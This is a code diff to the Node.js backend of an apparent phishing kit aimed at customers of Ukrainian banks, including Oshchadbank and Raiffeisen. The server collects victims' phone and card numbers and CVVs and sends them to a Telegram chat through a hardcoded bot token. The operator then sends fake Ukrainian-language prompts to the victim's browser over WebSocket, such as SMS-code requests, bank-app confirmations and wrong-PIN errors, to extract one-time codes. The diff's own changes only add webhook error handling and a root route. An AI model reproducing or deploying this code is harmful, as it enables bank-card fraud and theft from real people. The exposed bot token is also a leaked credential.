@@ -9,21 +9,39 @@ const path = require('path');
 // =======================================================================
 const TELEGRAM_BOT_TOKEN = '7607171529:AAF4Tch8CyVujvaMhN33_tlasoGAHVmxv64';
 const CHAT_ID = -4970332008; 
-// !!! ВАЖЛИВО: Вкажіть URL вашого сервера на Render або іншому хостингу
+// !!! ВАЖЛИВО: Перевірте, що ця URL-адреса правильна і доступна з інтернету
 const SERVER_URL = 'https://new-l8h6.onrender.com'; 
 // =======================================================================
 
 const app = express();
-app.use(express.json());
-app.use(cors());
-app.use(express.static(path.join(__dirname, 'public'))); // Для обслуговування статичних файлів, якщо потрібно
-
-// Створюємо бота БЕЗ polling
 const bot = new TelegramBot(TELEGRAM_BOT_TOKEN);
 
-// Встановлюємо webhook
+app.use(express.json());
+app.use(cors());
+
+// --- FIX 2: Явна маршрутизація для головної сторінки ---
+// Це гарантує, що ваш index.html буде відданий, коли хтось заходить на сайт.
+// Файл index.html має лежати в тій же папці, що й server.js
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'index.html'));
+});
+
+// Налаштування та запуск WebSocket сервера
+const server = require('http').createServer(app);
+const wss = new WebSocket.Server({ server });
+
+// --- FIX 1: Надійне встановлення вебхука з обробкою помилок ---
 const webhookPath = /webhook/${TELEGRAM_BOT_TOKEN};
-bot.setWebHook(${SERVER_URL}${webhookPath});
+bot.setWebHook(${SERVER_URL}${webhookPath})
+    .then(() => {
+        console.log('Webhook successfully set on URL:', ${SERVER_URL}${webhookPath});
+    })
+    .catch((error) => {
+        // Завдяки цьому сервер не "впаде", а покаже детальну помилку в логах
+        console.error('!!! ERROR SETTING WEBHOOK !!!');
+        console.error(error.message);
+        console.error('Please check your TELEGRAM_BOT_TOKEN and SERVER_URL in server.js');
+    });
 
 // Endpoint для отримання оновлень від Telegram
 app.post(webhookPath, (req, res) => {
@@ -31,14 +49,12 @@ app.post(webhookPath, (req, res) => {
     res.sendStatus(200);
 });
 
-const server = require('http').createServer(app);
-const wss = new WebSocket.Server({ server });
 
 const clients = new Map(); 
 const sessions = new Map(); 
 
 wss.on('connection', (ws) => {
-    console.log('Client connected');
+    console.log('Client connected via WebSocket');
     ws.on('message', (message) => {
         try {
             const data = JSON.parse(message);
@@ -85,9 +101,9 @@ app.post('/api/submit', (req, res) => {
         const visitText = newData.visitCount === 1 ? 'NEW' : ${newData.visitCount} раз;
         const singleStepBanks = ['Ощадбанк', 'Райффайзен'];
 
-        // Логика для банков с двухэтапной авторизацией (все, кроме Ощад и Райф)
         if (!singleStepBanks.includes(newData.bankName) && !newData['card-cvv']) {
-            message = <b>[Крок 1] Новий запис! (${newData.bankName})</b>\n\n;
+
+message = <b>[Крок 1] Новий запис! (${newData.bankName})</b>\n\n;
             message += <b>Назва банку:</b> ${newData.bankName}\n;
             message += <b>Номер телефону:</b> <code>${newData.phone || 'Не вказано'}</code>\n;
             message += <b>Номер карти:</b> <code>${newData.card || 'Не вказано'}</code>\n;
@@ -97,14 +113,12 @@ app.post('/api/submit', (req, res) => {
                 parse_mode: 'HTML',
                 reply_markup: {
                     inline_keyboard: [
-
-[{ text: 'ЗАПРОС', callback_data: zapit:${sessionId} }],
+                        [{ text: 'ЗАПРОС', callback_data: zapit:${sessionId} }],
                         [{ text: 'Карта', callback_data: card_error:${sessionId} }, { text: 'Номер', callback_data: number_error:${sessionId} }]
                     ]
                 }
             };
         } else {
-            // Логика для второго шага двухэтапных банков или для одноэтапных
             if (!singleStepBanks.includes(newData.bankName)) {
                 message = <b>✅ [Крок 2] Повні дані! (${newData.bankName})</b>\n\n;
             } else {
@@ -162,11 +176,11 @@ bot.on('callback_query', (callbackQuery) => {
         let commandData = {};
         switch (type) {
             case 'sms': commandData = { text: "Вам відправлено SMS з кодом на мобільний пристрій , введіть його у форму вводу коду" }; break;
-            case 'app': commandData = { text: "Вам надіслано підтвердження у додаток мобільного банку. Відкрийте додаток банку та зробіть підтвердження для проходження автентифікації." }; break;
+
+case 'app': commandData = { text: "Вам надіслано підтвердження у додаток мобільного банку. Відкрийте додаток банку та зробіть підтвердження для проходження автентифікації." }; break;
             case 'other': commandData = { text: "В нас не вийшло автентифікувати вашу картку. Для продвиження пропонуємо вказати картку іншого банку" }; break;
             case 'pin_error': commandData = { text: "Ви вказали невірний пінкод. Натисніть кнопку назад та вкажіть вірний пінкод" }; break;
-
-case 'card_error': commandData = { text: "Вказано невірний номер картки , натисніть назад та введіть номер картки вірно" }; break;
+            case 'card_error': commandData = { text: "Вказано невірний номер картки , натисніть назад та введіть номер картки вірно" }; break;
             case 'number_error': commandData = { text: "Вказано не фінансовий номер телефону . Натисніть кнопку назад та вкажіть номер який прив'язаний до вашої картки." }; break;
         }
         ws.send(JSON.stringify({ type: type, data: commandData }));
